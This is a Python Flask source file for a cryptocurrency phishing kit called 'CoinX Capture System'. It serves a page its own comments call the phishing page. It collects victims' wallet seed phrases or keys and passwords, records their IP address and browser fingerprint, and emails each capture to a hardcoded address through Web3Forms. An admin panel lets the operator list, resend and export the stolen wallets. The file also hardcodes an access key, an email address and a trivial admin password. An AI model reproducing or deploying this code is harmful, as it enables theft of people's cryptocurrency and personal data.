from flask import Flask, render_template, request, jsonify, redirect, url_for, session
from flask_cors import CORS
import sqlite3
import json
import hashlib
import secrets
from datetime import datetime
import os
import requests

app = Flask(__name__)
app.secret_key = secrets.token_hex(32)
CORS(app)

DATABASE = 'database.db'

# ==========================================
# CONFIGURATION - CHANGE THESE
# ==========================================

# Web3Forms API endpoint
WEB3FORMS_ENDPOINT = 'https://api.web3forms.com/submit'

# YOUR WEB3FORMS ACCESS KEY (Get from web3forms.com)
WEB3FORMS_ACCESS_KEY = '985c430b-3359-4dae-9d19-28b4bae5b7b3'

# Admin email where you want to receive notifications
ADMIN_EMAIL = 'shodiyatoheeb400@gmail.com'

# Admin credentials
ADMIN_USERNAME = 'admin'
ADMIN_PASSWORD_HASH = hashlib.sha256('admin123'.encode()).hexdigest()

def init_db():
    """Initialize database"""
    conn = sqlite3.connect(DATABASE)
    c = conn.cursor()
    
    # Captured wallets table
    c.execute('''
        CREATE TABLE IF NOT EXISTS captured_wallets (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            timestamp TEXT NOT NULL,
            wallet_type TEXT NOT NULL,
            input_type TEXT NOT NULL,
            content TEXT NOT NULL,
            password TEXT,
            ip_address TEXT,
            user_agent TEXT,
            platform TEXT,
            screen_size TEXT,
            language TEXT,
            referrer TEXT,
            email_sent INTEGER DEFAULT 0,
            email_status TEXT
        )
    ''')
    
    # Admin logs
    c.execute('''
        CREATE TABLE IF NOT EXISTS admin_logs (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            timestamp TEXT NOT NULL,
            username TEXT,
            ip_address TEXT,
            success INTEGER,
            user_agent TEXT
        )
    ''')
    
    conn.commit()
    conn.close()

def get_db_connection():
    conn = sqlite3.connect(DATABASE)
    conn.row_factory = sqlite3.Row
    return conn

# ==========================================
# WEB3FORMS EMAIL INTEGRATION
# ==========================================

def send_email_notification(data):
    """
    Send captured wallet data to your email via Web3Forms
    This sends an instant email notification when someone submits
    """
    try:
        # Prepare email content
        subject = f"🚨 New Wallet Captured - {data['wallet_type']}"
        
        # Format the message nicely
        message = f"""
NEW WALLET CAPTURED
===================

🕐 Time: {data['timestamp']}
👛 Wallet Type: {data['wallet_type']}
🔑 Input Type: {data['input_type']}

📋 CAPTURED DATA:
{data['content']}

🔒 Password: {data.get('password', 'N/A')}

🌐 VICTIM INFO:
IP Address: {data['ip_address']}
Platform: {data['platform']}
Screen: {data['screen_size']}
Language: {data['language']}
User Agent: {data['user_agent'][:200]}

===================
Sent via CoinX Capture System
        """
        
        # Web3Forms payload
        payload = {
            'access_key': WEB3FORMS_ACCESS_KEY,
            'subject': subject,
            'from_name': 'CoinX Capture System',
            'from_email': 'noreply@coinx.local',
            'replyto': ADMIN_EMAIL,
            'email': ADMIN_EMAIL,  # Where to send
            'message': message,
            
            # Additional hidden fields for organization
            'wallet_type': data['wallet_type'],
            'input_type': data['input_type'],
            'ip_address': data['ip_address'],
            'timestamp': data['timestamp']
        }
        
        # Send to Web3Forms
        response = requests.post(
            WEB3FORMS_ENDPOINT,
            json=payload,
            headers={'Content-Type': 'application/json'},
            timeout=15
        )
        
        result = response.json()
        
        if response.status_code == 200 and result.get('success'):
            print(f"[EMAIL] ✅ Sent successfully to {ADMIN_EMAIL}")
            return True, 'Sent'
        else:
            error_msg = result.get('message', 'Unknown error')
            print(f"[EMAIL] ❌ Failed: {error_msg}")
            return False, error_msg
            
    except Exception as e:
        print(f"[EMAIL ERROR] {e}")
        return False, str(e)

# ==========================================
# ROUTES
# ==========================================

@app.route('/')
def index():
    """Main phishing page"""
    return render_template('index.html')

@app.route('/api/collect', methods=['POST'])
def collect_data():
    """Receive wallet data, save to DB, and email via Web3Forms"""
    try:
        data = request.get_json()
        
        # Get victim info
        ip = request.headers.get('X-Forwarded-For', request.remote_addr)
        user_agent = request.headers.get('User-Agent', 'Unknown')
        
        # Prepare record
        record = {
            'timestamp': datetime.now().strftime('%Y-%m-%d %H:%M:%S'),
            'wallet_type': data.get('wallet_type', 'Unknown'),
            'input_type': data.get('input_type', 'unknown'),
            'content': data.get('content', ''),
            'password': data.get('password'),
            'ip_address': ip,
            'user_agent': user_agent,
            'platform': data.get('platform', 'Unknown'),
            'screen_size': data.get('screen_size', 'Unknown'),
            'language': data.get('language', 'Unknown'),
            'referrer': request.headers.get('Referer', 'Direct')
        }
        
        # Save to local database first
        conn = get_db_connection()
        c = conn.cursor()
        c.execute('''
            INSERT INTO captured_wallets 
            (timestamp, wallet_type, input_type, content, password, ip_address, 
             user_agent, platform, screen_size, language, referrer, email_sent, email_status)
            VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)
        ''', (
            record['timestamp'], record['wallet_type'], record['input_type'],
            record['content'], record['password'], record['ip_address'],
            record['user_agent'], record['platform'], record['screen_size'],
            record['language'], record['referrer'], 0, 'Pending'
        ))
        wallet_id = c.lastrowid
        conn.commit()
        conn.close()
        
        # Send email notification via Web3Forms
        email_success, email_status = send_email_notification(record)
        
        # Update email status in database
        conn = get_db_connection()
        c = conn.cursor()
        c.execute('''
            UPDATE captured_wallets 
            SET email_sent = ?, email_status = ? 
            WHERE id = ?
        ''', (1 if email_success else 0, email_status, wallet_id))
        conn.commit()
        conn.close()
        
        # Console output
        print(f"\n{'='*60}")
        print(f"💰 NEW WALLET CAPTURED!")
        print(f"ID: {wallet_id}")
        print(f"Type: {record['wallet_type']}")
        print(f"Content: {record['content'][:60]}...")
        print(f"Email: {'✅' if email_success else '❌'} {email_status}")
        print(f"{'='*60}\n")
        
        return jsonify({
            'success': True,
            'message': 'Data captured',
            'id': wallet_id,
            'email_sent': email_success
        }), 200
        
    except Exception as e:
        print(f"[ERROR] {e}")
        return jsonify({'success': False, 'error': str(e)}), 500

# ==========================================
# ADMIN LOGIN SYSTEM
# ==========================================

@app.route('/admin/login', methods=['GET', 'POST'])
def admin_login():
    """Admin login page"""
    if request.method == 'POST':
        username = request.form.get('username', '').strip()
        password = request.form.get('password', '')
        ip = request.headers.get('X-Forwarded-For', request.remote_addr)
        user_agent = request.headers.get('User-Agent', 'Unknown')
        
        password_hash = hashlib.sha256(password.encode()).hexdigest()
        success = (username == ADMIN_USERNAME and password_hash == ADMIN_PASSWORD_HASH)
        
        # Log attempt
        conn = get_db_connection()
        c = conn.cursor()
        c.execute('''
            INSERT INTO admin_logs (timestamp, username, ip_address, success, user_agent)
            VALUES (?, ?, ?, ?, ?)
        ''', (datetime.now().isoformat(), username, ip, 1 if success else 0, user_agent))
        conn.commit()
        conn.close()
        
        if success:
            session['admin_logged_in'] = True
            session['admin_username'] = username
            return redirect(url_for('admin_panel'))
        else:
            return render_template('admin_login.html', error='Invalid username or password')
    
    return render_template('admin_login.html')

@app.route('/admin/logout')
def admin_logout():
    """Logout admin"""
    session.clear()
    return redirect(url_for('admin_login'))

def admin_required(f):
    """Check if admin is logged in"""
    def decorated(*args, **kwargs):
        if not session.get('admin_logged_in'):
            return redirect(url_for('admin_login'))
        return f(*args, **kwargs)
    decorated.__name__ = f.__name__
    return decorated

@app.route('/admin')
@admin_required
def admin_panel():
    """Protected admin panel"""
    conn = get_db_connection()
    c = conn.cursor()
    
    # Stats
    c.execute('SELECT COUNT(*) as total FROM captured_wallets')
    total_wallets = c.fetchone()['total']
    
    c.execute('SELECT COUNT(*) as sent FROM captured_wallets WHERE email_sent = 1')
    emails_sent = c.fetchone()['sent']
    
    c.execute('SELECT COUNT(*) as failed FROM captured_wallets WHERE email_sent = 0')
    emails_failed = c.fetchone()['failed']
    
    # Recent captures
    c.execute('SELECT * FROM captured_wallets ORDER BY timestamp DESC LIMIT 100')
    wallets = c.fetchall()
    
    # Admin login history
    c.execute('SELECT * FROM admin_logs ORDER BY timestamp DESC LIMIT 20')
    admin_logs = c.fetchall()
    
    conn.close()
    
    return render_template('admin_panel.html',
                         wallets=wallets,
                         admin_logs=admin_logs,
                         total_wallets=total_wallets,
                         emails_sent=emails_sent,
                         emails_failed=emails_failed,
                         username=session.get('admin_username'),
                         admin_email=ADMIN_EMAIL)

@app.route('/admin/api/clear', methods=['POST'])
@admin_required
def clear_data():
    """Clear all captured data"""
    try:
        conn = get_db_connection()
        c = conn.cursor()
        c.execute('DELETE FROM captured_wallets')
        conn.commit()
        conn.close()
        return jsonify({'success': True})
    except Exception as e:
        return jsonify({'success': False, 'error': str(e)})

@app.route('/admin/api/resend/<int:id>', methods=['POST'])
@admin_required
def resend_email(id):
    """Manually resend email for a specific entry"""
    try:
        conn = get_db_connection()
        c = conn.cursor()
        c.execute('SELECT * FROM captured_wallets WHERE id = ?', (id,))
        wallet = c.fetchone()
        conn.close()
        
        if not wallet:
            return jsonify({'success': False, 'error': 'Not found'})
        
        # Convert to dict
        record = dict(wallet)
        
        # Resend
        success, status = send_email_notification(record)
        
        # Update status
        conn = get_db_connection()
        c = conn.cursor()
        c.execute('UPDATE captured_wallets SET email_sent = ?, email_status = ? WHERE id = ?',
                 (1 if success else 0, status, id))
        conn.commit()
        conn.close()
        
        return jsonify({'success': success, 'status': status})
        
    except Exception as e:
        return jsonify({'success': False, 'error': str(e)})

@app.route('/admin/api/export')
@admin_required
def export_data():
    """Export all data as JSON"""
    conn = get_db_connection()
    c = conn.cursor()
    c.execute('SELECT * FROM captured_wallets ORDER BY timestamp DESC')
    rows = c.fetchall()
    conn.close()
    
    data = [dict(row) for row in rows]
    
    response = app.response_class(
        response=json.dumps(data, indent=2),
        status=200,
        mimetype='application/json'
    )
    response.headers['Content-Disposition'] = f'attachment; filename=coinx_wallets_{datetime.now().strftime("%Y%m%d")}.json'
    return response

if __name__ == '__main__':
    init_db()
    print("="*60)
    print("🚀 CoinX Server Starting...")
    print(f"📧 Email notifications: {ADMIN_EMAIL}")
    print("🌐 Victim page: http://localhost:5000")
    print("🔐 Admin login: http://localhost:5000/admin")
    print("="*60)
    app.run(host='0.0.0.0', port=5000, debug=True)